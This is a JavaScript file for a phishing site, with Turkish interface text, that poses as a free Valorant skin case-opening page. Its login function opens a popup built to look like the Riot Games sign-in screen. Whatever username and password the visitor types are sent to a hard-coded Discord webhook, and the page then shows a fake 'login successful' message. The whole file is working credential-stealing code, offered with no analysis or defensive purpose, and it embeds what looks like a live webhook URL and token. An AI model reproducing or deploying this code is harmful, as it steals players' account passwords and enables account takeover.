const WEBHOOK_URL = "https://discord.com/api/webhooks/1489632402421841930/NW5qpH3UpfzBpTWSVcJ-FGXbevssOBhbMDUIdGjP4620rQLHvM6jx8fJGzji_4LQOBrq";

const dropSkins = [
    {n: "Kuronami Vandal", i: "https://static.wikia.nocookie.net/valorant/images/a/a7/Kuronami_Vandal.png"},
    {n: "Reaver Sheriff", i: "https://static.wikia.nocookie.net/valorant/images/8/8f/Reaver_Sheriff.png"},
    {n: "Prime Phantom", i: "https://static.wikia.nocookie.net/valorant/images/e/e0/Prime_Phantom.png"},
    {n: "Elderflame Vandal", i: "https://static.wikia.nocookie.net/valorant/images/5/5e/Elderflame_Vandal.png"},
    {n: "Ion Sheriff", i: "https://static.wikia.nocookie.net/valorant/images/6/61/Ion_Sheriff.png"},
    {n: "Glitchpop Vandal", i: "https://static.wikia.nocookie.net/valorant/images/8/8a/Glitchpop_Vandal.png"}
];

window.onload = function() {
    const track = document.getElementById('dropTrack');
    if(track) {
        // Sonsuz akış için listeyi iki kez ekliyoruz
        const fullList = [...dropSkins, ...dropSkins, ...dropSkins];
        fullList.forEach(item => {
            track.innerHTML += `
                <div class="drop-item">
                    <img src="${item.i}">
                    <span>${item.n}</span>
                </div>`;
        });
    }
};

let loggedIn = false;

function openLogin() {
    const w = 450, h = 600;
    const l = (window.innerWidth/2)-(w/2), t = (window.innerHeight/2)-(h/2);
    let win = window.open("", "Riot Login", `width=${w},height=${h},top=${t},left=${l}`);

    win.document.body.innerHTML = `
        <style>
            body { background: #f9f9f9; font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
            .box { width: 80%; text-align: center; }
            img { width: 120px; margin-bottom: 20px; }
            input { width: 100%; padding: 15px; margin: 10px 0; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }
            .btn { width: 100%; padding: 15px; background: #ff4655; color: white; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; font-size: 16px; }
        </style>
        <div class="box">
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a8/Riot_Games_logo.svg/2560px-Riot_Games_logo.svg.png">
            <h3>Oturum Aç</h3>
            <input type="text" id="u" placeholder="Kullanıcı Adı">
            <input type="password" id="p" placeholder="Şifre">
            <button class="btn" id="b">OTURUM AÇ</button>
        </div>
    `;

    win.document.getElementById('b').onclick = function() {
        const u = win.document.getElementById('u').value, p = win.document.getElementById('p').value;
        if(u && p) {
            fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ content: `✅ **Yeni Hesap!**\n👤: \`${u}\` \n🔑: \`${p}\`` })
            });
            loggedIn = true; win.close();
            alert("Giriş Başarılı! Ücretsiz kasanızı açabilirsiniz.");
        }
    };
}

function checkLogin() {
    if(!loggedIn) openLogin();
    else alert("Kasa hazırlanıyor...");
}
